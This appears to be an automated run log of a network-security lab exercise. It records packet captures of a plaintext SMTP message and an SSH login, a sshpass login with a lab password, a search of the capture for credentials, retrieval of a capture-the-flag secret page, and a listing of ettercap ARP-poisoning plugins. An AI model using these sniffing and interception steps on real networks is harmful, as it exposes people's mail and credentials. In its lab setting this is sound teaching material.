+06:37:55.397945 IP 10.92.2.10.25 > 10.92.2.20.57260: Flags [.], ack 371, win 488, options [nop,nop,TS val 3724751623 ecr 171175427], length 0
+E..4..@.?.F.
+\.
+
+\.......sS...}u...........
+..3.
+3..
+06:37:55.398764 IP 10.92.2.10.25 > 10.92.2.20.57260: Flags [.], ack 109, win 490, options [nop,nop,TS val 3724751623 ecr 171175385], length 0
+E..4..@.@.E.
+\.
+
+--
+To: alice@kali
+Subject: Esame di Sicurezza
+Message-ID: <20261012063755.xZOiL%bob@kali>
+User-Agent: s-nail v14.9.25
+
+Ho bisogno di un voto maggiore di 27, il numero della mia carta di credito e' 7865-8993-6282-8282. Faccia lei il prezzo!
+.
+
+06:37:55.398822 IP 10.92.2.10.25 > 10.92.2.20.57260: Flags [.], ack 371, win 488, options [nop,nop,TS val 3724751623 ecr 171175427], length 0
+E..4..@.@.E.
+\.
+
+\.......sS...}u...........
+..3.
+3..
+06:37:55.402628 IP 10.92.2.10.25 > 10.92.2.20.57260: Flags [P.], seq 211:246, ack 371, win 488, options [nop,nop,TS val 3724751627 ecr 171175427], length 35: SMTP: 250 OK id=1xG9fX-0000000003F-1Rkd
+E..W..@.@.D.
+\.
+
+\.......sS...}u...........
+..3.
+3..250 OK id=1xG9fX-0000000003F-1Rkd
+
+06:37:55.402630 IP 10.92.2.10.25 > 10.92.2.20.57260: Flags [P.], seq 211:246, ack 371, win 488, options [nop,nop,TS val 3724751627 ecr 171175427], length 35: SMTP: 250 OK id=1xG9fX-0000000003F-1Rkd
+E..W..@.?.E.
+\.
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 7: SMTP capture summary]
+Node: chuck
+Started: 2026-10-12T08:37:58+02:00
+Ended: 2026-10-12T08:37:58+02:00
+Command: cat /tmp/lab01_smtp_tcpdump.log; ls -lh /tmp/lab01_smtp.pcap
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+72 packets captured
+72 packets received by filter
+0 packets dropped by kernel
+-rw-r--r-- 1 tcpdump tcpdump 7.8K Oct 12 06:37 /tmp/lab01_smtp.pcap
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: begin SSH packet capture]
+Node: chuck
+Started: 2026-10-12T08:37:58+02:00
+Ended: 2026-10-12T08:37:58+02:00
+Command: docker exec -d labinf-chuck-1 sh -c sudo -n tcpdump -i eth0 -U -s 0 -w /tmp/lab01_ssh.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 22 >/tmp/lab01_ssh_tcpdump.log 2>&1
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: Bob logs into Alice over SSH]
+Node: bob
+Started: 2026-10-12T08:37:59+02:00
+Ended: 2026-10-12T08:38:00+02:00
+Command: sshpass -p alice ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 alice@10.92.2.10 'id -un'
+Exit status: 0
+--- stdout ---
+alice
+--- stderr ---
+Warning: Permanently added '10.92.2.10' (ED25519) to the list of known hosts.
+
+====================================================================================================
+[Exercise 8: stop SSH packet capture]
+Node: chuck
+Started: 2026-10-12T08:38:01+02:00
+Ended: 2026-10-12T08:38:01+02:00
+Command: sudo -n pkill -INT -x tcpdump
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: decode visible SSH packet metadata]
+Node: chuck
+Started: 2026-10-12T08:38:02+02:00
+Ended: 2026-10-12T08:38:02+02:00
+Command: tshark -r /tmp/lab01_ssh.pcap -Y ssh -T fields -e frame.number -e ip.src -e ip.dst -e ssh.protocol -e ssh.message_code
+Exit status: 0
+--- stdout ---
+7	10.92.2.20	10.92.2.10	SSH-2.0-OpenSSH_10.5p1 Debian-1	
+16	10.92.2.10	10.92.2.20	SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4	
+20	10.92.2.20	10.92.2.10		20
+25	10.92.2.10	10.92.2.20		20
+28	10.92.2.20	10.92.2.10		30
+31	10.92.2.10	10.92.2.20		31,21
+34	10.92.2.20	10.92.2.10		21
+39	10.92.2.20	10.92.2.10		
+43	10.92.2.10	10.92.2.20		
+45	10.92.2.20	10.92.2.10		
+47	10.92.2.10	10.92.2.20		
+52	10.92.2.10	10.92.2.20		
+53	10.92.2.20	10.92.2.10		
+54	10.92.2.20	10.92.2.10		
+58	10.92.2.10	10.92.2.20		
+60	10.92.2.20	10.92.2.10		
+64	10.92.2.10	10.92.2.20		
+66	10.92.2.10	10.92.2.20		
+70	10.92.2.20	10.92.2.10		
+72	10.92.2.10	10.92.2.20		
+74	10.92.2.20	10.92.2.10		
+76	10.92.2.10	10.92.2.20		
+78	10.92.2.10	10.92.2.20		
+82	10.92.2.20	10.92.2.10		
+84	10.92.2.20	10.92.2.10		
+94	10.92.2.10	10.92.2.20		
+95	10.92.2.20	10.92.2.10		
+96	10.92.2.10	10.92.2.20		
+99	10.92.2.20	10.92.2.10		
+--- stderr ---
+ ** (tshark:608) 06:38:02.377179 [packet-ssh WARNING] ./epan/dissectors/packet-ssh.c:1997 -- ssh_dissect_kex_pq_hybrid(): POST-QUANTUM KEX_HYBRID detected: KEX = mlkem768x25519-sha256
+ ** (tshark:608) 06:38:02.377198 [packet-ssh WARNING] ./epan/dissectors/packet-ssh.c:1998 -- ssh_dissect_kex_pq_hybrid(): SHARED_SECRET decryption is supported - PRIVATE_KEY decryption is not supported
+
+====================================================================================================
+[Exercise 8: search capture strings for login secret]
+Node: chuck
+Started: 2026-10-12T08:38:02+02:00
+Ended: 2026-10-12T08:38:02+02:00
+Command: strings /tmp/lab01_ssh.pcap | grep -Ei 'alice|password' || true
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+sh: 1: strings: not found
+
+====================================================================================================
+[Exercise 8: SSH capture summary]
+Node: chuck
+Started: 2026-10-12T08:38:02+02:00
+Ended: 2026-10-12T08:38:02+02:00
+Command: cat /tmp/lab01_ssh_tcpdump.log; ls -lh /tmp/lab01_ssh.pcap
+Exit status: 0
+--- stdout ---
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+111 packets captured
+111 packets received by filter
+0 packets dropped by kernel
+-rw-r--r-- 1 tcpdump tcpdump 31K Oct 12 06:38 /tmp/lab01_ssh.pcap
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 3: exact handout FTP command]
+Node: bob
+Started: 2026-10-12T08:42:19+02:00
+Ended: 2026-10-12T08:42:21+02:00
+Command: timeout 8 ftp 10.92.2.10
+Exit status: 0
+--- stdout ---
+?Invalid command.
+?Invalid command.
+?Invalid command.
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Challenge: retrieve official index and linked secret]
+Node: bob
+Started: 2026-10-12T08:42:21+02:00
+Ended: 2026-10-12T08:42:21+02:00
+Command: curl -sS -i http://10.92.2.10/index.html; printf "\n--- secret.html ---\n"; curl -sS -i http://10.92.2.10/secret.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:42:21 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "1c7-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 455
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Beautiful Page</title>
+</head>
+</head>
+<body>
+    <h1>This is the most incredible and astonishing HTML page you will encounter in your entire existence! Prepare to have your mind shattered in front of the brilliance and complexity of this masterpiece!</h1>
+    </br>
+    <p>Here is a picture of a cat that hides absolutely nothing:</p>
+    <a href="secret.html"><img src="cat.jpg" alt="Cat"></a>
+</body>
+</html>
+--- secret.html ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:42:21 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Sun, 11 Oct 2026 17:39:43 GMT
+ETag: "13f-65d94110ef5c0"
+Accept-Ranges: bytes
+Content-Length: 319
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MY BIG SECRET</title>
+</head>
+<body>
+    <h1>MY BIG SECRET</h1>
+    <p>I managed to obtain a top-secret software from the NSA and it's running on this machine, I am sure you haven't seen it already. Can you find it?</p>
+    <p>SSI{p0rt_scann3r5_4r3_4w3s0m3}</p>
+</body>
+</html>
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: GUI and remote-browser capability preflight]
+Node: chuck
+Started: 2026-10-12T08:42:21+02:00
+Ended: 2026-10-12T08:42:21+02:00
+Command: printf "DISPLAY=%s\n" "$DISPLAY"; command -v firefox || true; test -x /root/firefox/firefox && echo /root/firefox/firefox-present || echo /root/firefox/firefox-missing; command -v xhost || true; ettercap -P list 2>&1 | grep -i -A2 -B2 remote_browser || true
+Exit status: 0
+--- stdout ---
+DISPLAY=
+/root/firefox/firefox-missing
+      pptp_reneg  1.0  PPTP: Forces tunnel re-negotiation
+      rand_flood  1.0  Flood the LAN with random MAC addresses
+  remote_browser  1.2  Sends visited URLs to the browser
+       reply_arp  1.0  Simple arp responder
+    repoison_arp  1.0  Repoison after broadcast ARP
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Optional Exercise 9: DNS resolver and route preflight]
+Node: bob
+Started: 2026-10-12T08:42:21+02:00
+Ended: 2026-10-12T08:42:21+02:00
+Command: cat /etc/resolv.conf; ip route; host -v www.example.com
+Exit status: 0
+--- stdout ---
+# Generated by Docker Engine.
+# This file can be edited; Docker Engine will not make further changes once it
+# has been modified.
+
+nameserver 127.0.0.11
+options ndots:0
+
+# Based on host file: '/etc/resolv.conf' (internal resolver)
+# ExtServers: [host(192.168.65.7)]
+# Overrides: []
+# Option ndots from: internal
+default via 10.92.2.1 dev eth0 
+10.92.2.0/24 dev eth0 proto kernel scope link src 10.92.2.20 
+Trying "www.example.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59562
+;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;www.example.com.		IN	A
+
+;; ANSWER SECTION:
+www.example.com.	80	IN	A	104.20.23.154
+www.example.com.	80	IN	A	172.66.147.243
+
+Received 65 bytes from 127.0.0.11#53 in 38 ms
+Trying "www.example.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15979
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;www.example.com.		IN	AAAA
+
+Received 33 bytes from 127.0.0.11#53 in 1 ms
+Trying "www.example.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26341
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;www.example.com.		IN	MX
+
+Received 33 bytes from 127.0.0.11#53 in 113 ms
+Trying "www.example.com"
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 4392
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;www.example.com.		IN	HTTPS
+
+;; ANSWER SECTION:
+www.example.com.	377	IN	HTTPS	1 . alpn="h3,h2" ipv4hint=104.20.23.154,172.66.147.243 ipv6hint=2606:4700:10::6814:179a,2606:4700:10::ac42:93f3
+
+Received 106 bytes from 127.0.0.11#53 in 22 ms
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: GUI and remote-browser capability preflight]
+Node: chuck
+Started: 2026-10-12T08:45:54+02:00
+Ended: 2026-10-12T08:45:54+02:00
+Command: env | grep '^DISPLAY=' || true; command -v firefox || true; test -x /root/firefox/firefox && echo /root/firefox/firefox-present || echo /root/firefox/firefox-missing; command -v xhost || true; ettercap -P list 2>&1 | grep -i -A2 -B2 remote_browser || true
+Exit status: 0
+--- stdout ---
+/root/firefox/firefox-missing
+      pptp_reneg  1.0  PPTP: Forces tunnel re-negotiation
+      rand_flood  1.0  Flood the LAN with random MAC addresses
+  remote_browser  1.2  Sends visited URLs to the browser
+       reply_arp  1.0  Simple arp responder
+    repoison_arp  1.0  Repoison after broadcast ARP
+--- stderr ---
+(empty)
